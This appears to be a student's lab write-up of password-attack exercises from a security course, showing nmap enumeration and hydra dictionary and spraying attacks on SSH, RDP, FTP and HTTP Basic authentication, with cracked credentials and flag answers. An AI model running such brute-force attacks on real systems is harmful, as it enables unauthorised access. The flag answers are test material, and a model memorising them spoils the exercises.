

# 15.1.1 Network Services


1. Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the _george_ user's home directory.

```bash
# Enumerate
sudo nmap -Pn 192.168.241.201
	PORT     STATE SERVICE
	22/tcp   open  ssh
	2222/tcp open  EtherNetIP-1

sudo nmap -sV 192.168.241.201
	PORT     STATE SERVICE VERSION
	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Use hydra
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
	[2222][ssh] host: 192.168.241.201   login: george   password: chocolate

# Login
ssh george@192.168.241.201 -p 2222
	password:   chocolate
```

> Answer:  OS{5042809f26d448f022f68490b351794d}



2. Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on VM #2 (BRUTE2). Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames _justin_ and _daniel_.

```bash
# Enumerate
sudo -Pn 192.168.241.202
	PORT     STATE SERVICE
	21/tcp   open  ftp
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt

# Password spray attack
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.241.202
	[3389][rdp] host: 192.168.241.202   login: justin   password: SuperS3cure1337#
	[3389][rdp] host: 192.168.241.202   login: daniel   password: SuperS3cure1337#

# Login
rdesktop 192.168.241.202 -u justin -p SuperS3cure1337#
```

> Answer:  OS{6527425c127b4b1f5938d30c9187ecff}



3. Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the _itadmin_ user and find the flag.

```bash
# Enumerate
sudo nmap -Pn 192.168.241.202
	PORT     STATE SERVICE
	21/tcp   open  ftp
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt

# Attack
hydra ftp://192.168.241.202 -l itadmin -P /usr/share/wordlists/rockyou.txt
	[21][ftp] host: 192.168.241.202   login: itadmin   password: hellokitty

# Connect to ftp
ftp 192.168.241.202                                                             
	Connected to 192.168.241.202.
	220-FileZilla Server 1.4.1
	220 Please visit https://filezilla-project.org/
Name (192.168.241.202:kali): itadmin
	331 Please, specify the password.
Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
ftp> ls
	229 Entering Extended Passive Mode (|||52238|)
	150 Starting data transfer.
	-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
	-rw-rw-rw- 1 ftp ftp              38 Mar 30 06:01 flag.txt
	226 Operation successful
ftp> get flag.txt
ftp> exit

cat flag.txt
```

> Answer:  OS{df4abd9eb8e51b1ce81dcbc9635535d4}


# 15.1.2 HTTP Post

2. The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user _admin_. Once you have identified the correct password, enter it as answer to this exercise.

```bash
# Enumerate
sudo nmap -Pn 192.168.227.201
	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack ttl 61
	80/tcp open  http    syn-ack ttl 60
```

- Open Burp and turn proxy on
- Navigate to site
- Login user:pass
- Take note of request body and failed login identifier
![](15.1.2.2ex_http_invalid.png)

- As it's only a GET request, research how to use **hydra's** http-get for Basic Authentication
- https://notes.benheater.com/books/hydra/page/brute-force-http-basic-authentication-with-hydra
```bash
hydra -U http-get
	Help for module http-get:
	============================================================================
	Module http-get requires the page to authenticate.
	The following parameters are optional:
	 (a|A)=auth-type   specify authentication mechanism to use: BASIC, NTLM or MD5
	 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
	 (F|S)=check for text in the HTTP reply. S= means if this text is found, a
	       valid account has been found, F= means if this string is present the
	       combination is invalid. Note: this must be the last option supplied.
	For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
```

- Craft attack
```bash
hydra -I -l admin -P /usr/share/wordlists/rockyou.txt "http-get://192.168.227.201:80/:A=BASIC:F=401"
	[80][http-get] host: 192.168.227.201   login: admin   password: 789456]
```

> Answer:  789456